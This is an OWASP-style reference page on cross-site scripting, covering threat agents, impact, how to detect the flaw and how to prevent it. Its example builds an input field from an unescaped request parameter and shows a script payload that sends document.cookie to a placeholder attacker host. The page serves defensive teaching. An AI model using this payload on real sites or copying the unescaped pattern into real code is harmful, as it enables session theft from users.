`    <td ``>`

Consider anyone who can send untrusted data to the system, including
external users, internal users, and administrators.

</td>

`    <td ``>`

Attacker sends text-based attack scripts that exploit the interpreter in
the browser. Almost any source of data can be an attack vector,
including internal sources such as data from the database.

</td>

`    <td colspan=2  ``>`

[XSS](https://www.owasp.org/index.php/Cross-site_Scripting_\(XSS\)) is
the most prevalent web application security flaw. XSS flaws occur when
an application includes user supplied data in a page sent to the browser
without properly validating or escaping that content. There are three
known types of XSS flaws: 1)
[Stored](https://www.owasp.org/index.php/Cross-site_Scripting_\(XSS\)),
2)
[Reflected](https://www.owasp.org/index.php/Cross-site_Scripting_\(XSS\)),
and 3) [DOM based XSS](https://www.owasp.org/index.php/DOM_Based_XSS).

Detection of most XSS flaws is fairly easy via testing or code analysis.

</td>

`    <td ``>`

Attackers can execute scripts in a victim’s browser to hijack user
sessions, deface web sites, insert hostile content, redirect users,
hijack the user’s browser using malware, etc.

</td>

`    <td ``>Consider the business value of the affected system and all the data it processes.`

Also consider the business impact of public exposure of the
vulnerability.

</td>

You are vulnerable if you do not ensure that all user supplied input is
properly escaped, or you do not verify it to be safe via input
validation, before including that input in the output page. Without
proper output escaping or validation, such input will be treated as
active content in the browser. If Ajax is being used to dynamically
update the page, are you using [safe JavaScript
APIs](https://www.owasp.org/images/c/c5/Unraveling_some_Mysteries_around_DOM-based_XSS.pdf)?
For unsafe JavaScript APIs, encoding or validation must also be used.

Automated tools can find some XSS problems automatically. However, each
application builds output pages differently and uses different browser
side interpreters such as JavaScript, ActiveX, Flash, and Silverlight,
making automated detection difficult. Therefore, complete coverage
requires a combination of manual code review and penetration testing, in
addition to automated approaches.

Web 2.0 technologies, such as Ajax, make XSS much more difficult to
detect via automated tools.

Preventing XSS requires separation of untrusted data from active browser
content.

1.  The preferred option is to properly escape all untrusted data based
    on the HTML context (body, attribute, JavaScript, CSS, or URL) that
    the data will be placed into. See the [OWASP XSS Prevention Cheat
    Sheet](https://www.owasp.org/index.php/XSS_\(Cross_Site_Scripting\)_Prevention_Cheat_Sheet)
    for details on the required data escaping techniques.
2.  Positive or “whitelist” input validation is also recommended as it
    helps protect against XSS, but is <u>not a complete defense</u> as
    many applications require special characters in their input. Such
    validation should, as much as possible, validate the length,
    characters, format, and business rules on that data before accepting
    the input.
3.  For rich content, consider auto-sanitization libraries like OWASP’s
    [AntiSamy](https://www.owasp.org/index.php/AntiSamy) or the [Java
    HTML Sanitizer
    Project](https://www.owasp.org/index.php/OWASP_Java_HTML_Sanitizer_Project).
4.  Consider [Content Security Policy
    (CSP)](https://www.owasp.org/index.php/Content_Security_Policy) to
    defend against XSS across your entire site.

The application uses untrusted data in the construction of the following
HTML snippet without validation or escaping:

<span style="color:red;"> (String) page +=
"<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";

</span>

The attacker modifies the 'CC' parameter in their browser to:

<span style="color:red;"> <span style="color:red;">'\>

<script>

document.location= 'http://www.attacker.com/cgi-bin/cookie.cgi
?foo='+document.cookie

</script>

'.</span>

</span>

This causes the victim’s session ID to be sent to the attacker’s
website, allowing the attacker to hijack the user’s current session.

Note that attackers can also use XSS to defeat any automated CSRF
defense the application might employ. See A8 for info on CSRF.

  - \[\[XSS (Cross Site Scripting) Prevention Cheat Sheet | OWASP XSS
    Prevention Cheat Sheet

\]\]

  - [OWASP DOM based XSS Prevention Cheat
    Sheet](DOM_based_XSS_Prevention_Cheat_Sheet "wikilink")
  - [OWASP Cross-Site Scripting
    Article](Cross-site_Scripting_\(XSS\) "wikilink")
  - [ESAPI Encoder
    API](http://owasp-esapi-java.googlecode.com/svn/trunk_doc/latest/org/owasp/esapi/Encoder.html)
  - [ASVS: Output Encoding/Escaping Requirements (V6)](ASVS "wikilink")
  - [OWASP AntiSamy: Sanitization Library](AntiSamy "wikilink")
  - [Testing Guide: 1st 3 Chapters on Data Validation
    Testing](Testing_for_Data_Validation "wikilink")
  - [OWASP Code Review Guide: Chapter on XSS
    Review](Reviewing_Code_for_Cross-site_scripting "wikilink")
  - [OWASP XSS Filter Evasion Cheat
    Sheet](XSS_Filter_Evasion_Cheat_Sheet "wikilink")

<!-- end list -->

  - [CWE Entry 79 on Cross-Site
    Scripting](http://cwe.mitre.org/data/definitions/79.html)